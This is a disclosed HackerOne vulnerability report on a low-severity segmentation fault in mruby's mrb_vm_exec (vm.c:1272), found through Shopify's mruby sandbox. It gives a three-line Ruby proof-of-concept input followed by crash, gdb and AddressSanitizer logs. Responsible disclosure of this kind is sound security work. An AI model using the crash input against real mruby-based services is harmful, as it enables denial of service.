# SIGSEGV - mrb_vm_exec - vm.c in line:1272

## Report Details
- **Report ID**: 196386
- **URL**: https://hackerone.com/reports/196386
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-01-06T20:17:26.992Z
- **Disclosed**: 2017-03-09T01:23:29.817Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC:
-------------------

The following code triggers the bug (attached as test_mrb_vm_exec_1272.rb):
	
	a,a,a,a=0,def e
	end
	a[]

Sandbox:
-------------------

	x@x:~/Desktop/research/mruby-engine/bin$ ./sandbox test_mrb_vm_exec_1272.rb 
	./sandbox:20: [BUG] Segmentation fault at 0x00000000000018
	ruby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]

	-- Control frame information -----------------------------------------------
	c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
	c:0002 p:0186 s:0005 E:0026a8 EVAL   ./sandbox:20 [FINISH]
	c:0001 p:0000 s:0002 E:001a10 TOP    [FINISH]

	-- Ruby level backtrace information ----------------------------------------
	./sandbox:20:in `<main>'
	./sandbox:20:in `sandbox_eval'

	-- Machine register context ------------------------------------------------
	 RIP: 0x00007f75b9c8c89f RBP: 0x00007f75b881b100 RSP: 0x00007f75b88119e0
	 RAX: 0x00007f75b8825b40 RBX: 0x0000000000000000 RCX: 0x00007f75b8825b30
	 RDX: 0x0000000000000008 RDI: 0x00007f75b8825b40 RSI: 0x0000000000000000
	  R8: 0x00007f75b8825b30  R9: 0x0000000000000002 R10: 0x0000000000000075
	 R11: 0x0000000000000000 R12: 0x00007f75b881fa00 R13: 0x0000000000000003
	 R14: 0x0000000000000000 R15: 0x0000000000000000 EFL: 0x0000000000010202

	-- C level backtrace information -------------------------------------------
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be38ed55]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be38ef8c]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be26b06b]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be32114e]
	/lib/x86_64-linux-gnu/libc.so.6 [0x7f75bde6bff0]
	/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2aaf) [0x7f75b9c8c89f] /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:125
	/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x5c) [0x7f75b9c9084c] /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772
	/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0xbe) [0x7f75b9c7e41e] ../../../../ext/mruby_engine/eval_monitored.c:68
	/lib/x86_64-linux-gnu/libpthread.so.0(start_thread+0xc2) [0x7f75bdc1f182] pthread_create.c:312
	/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f75bdf3030d] ../sysdeps/unix/sysv/linux/x86_64/clone.S:111
	...
	...
	...
	7f75be896000-7f75be89b000 rw-p 00000000 00:00 0                          [stack:3369]
	7f75be89b000-7f75be89c000 r--p 00022000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so
	7f75be89c000-7f75be89d000 rw-p 00023000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so
	7f75be89d000-7f75be89e000 rw-p 00000000 00:00 0 
	7fff415ad000-7fff41dac000 rw-p 00000000 00:00 0                          [stack]
	7fff41dfe000-7fff41e00000 r-xp 00000000 00:00 0                          [vdso]
	ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]


	[NOTE]
	You may have encountered a bug in the Ruby interpreter or extension libraries.
	Bug reports are welcome.
	For details: http://www.ruby-lang.org/bugreport.html

	Aborted (core dumped)

Debug:
-------------------

	(gdb) r sandbox test_mrb_vm_exec_1272.rb 
	Starting program: /usr/bin/ruby sandbox test_mrb_vm_exec_1272.rb
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
	[New Thread 0x7ffff7ff7700 (LWP 3230)]
	[New Thread 0x7ffff1f73700 (LWP 3277)]

	Program received signal SIGSEGV, Segmentation fault.
	[Switching to Thread 0x7ffff1f73700 (LWP 3277)]
	mrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=0x7ffff1f7c100, proc@entry=0x7ffff1f7c130, pc=0x7ffff36b04e8 <call_iseq>) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1272
	1272	        regs[0] = m->env->stack[0];
	(gdb) l
	1267	          stack_extend(mrb, (irep->nregs < 3) ? 3 : irep->nregs, 3);
	1268	        }
	1269	        else {
	1270	          stack_extend(mrb, irep->nregs, ci->argc+2);
	1271	        }
	1272	        regs[0] = m->env->stack[0];
	1273	        pc = irep->iseq;
	1274	        JUMP;
	1275	      }
	1276	    }


Backtrace:
-------------------

	(gdb) bt
	#0  mrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=0x7ffff1f7c100, proc@entry=0x7ffff1f7c130, pc=0x7ffff36b04e8 <call_iseq>) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1272
	#1  0x00007ffff33f184c in mrb_vm_run (mrb=0x7ffff1f744e0, proc=0x7ffff1f7c130, self=..., stack_keep=stack_keep@entry=0) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772
	#2  0x00007ffff33df41e in mruby_engine_monitored_eval (data=0x7ffff1f743e0) at ../../../../ext/mruby_engine/eval_monitored.c:68
	#3  0x00007ffff7380182 in start_thread (arg=0x7ffff1f73700) at pthread_create.c:312
	#4  0x00007ffff769130d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111

Clang - mirb - ASAN - Log:
-------------------

	x@x:~/Desktop/research/clang/mruby/bin$ ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-3.8/bin/llvm-symbolizer ./mirb test_mrb_vm_exec_1272.rb 
	mirb - Embeddable Interactive Ruby Shell

	 => [0, :e]
	ASAN:DEADLYSIGNAL
	=================================================================
	==3344==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000018 (pc 0x00000050d4ec bp 0x7fff670b43f0 sp 0x7fff670acec0 T0)
		#0 0x50d4eb in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27
		#1 0x501d5b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10
		#2 0x4f3ef8 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18
		#3 0x7f8f3d340ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#4 0x41a595 in _start (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a595)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27 in mrb_vm_exec
	==3344==ABORTING

	
Clang - mruby - ASAN - Log:
-------------------

	x@x:~/Desktop/research/clang/mruby/bin$ ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-3.8/bin/llvm-symbolizer ./mruby test_mrb_vm_exec_1272.rb 
	ASAN:DEADLYSIGNAL
	=================================================================
	==3346==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000018 (pc 0x000000656aac bp 0x7fff5a504450 sp 0x7fff5a4fcf20 T0)
		#0 0x656aab in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27
		#1 0x64b31b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10
		#2 0x6773e8 in mrb_top_run /home/x/Desktop/research/clang/mruby/src/vm.c:2487:12
		#3 0x616529 in mrb_load_exec /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7
		#4 0x6171c5 in mrb_load_file_cxt /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5764:10
		#5 0x4f3af5 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
		#6 0x7f16c78e2ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#7 0x41a505 in _start (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a505)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27 in mrb_vm_exec
	==3346==ABORTING

## Attachments
- test_mrb_vm_exec_1272.rb
- sandbox.log
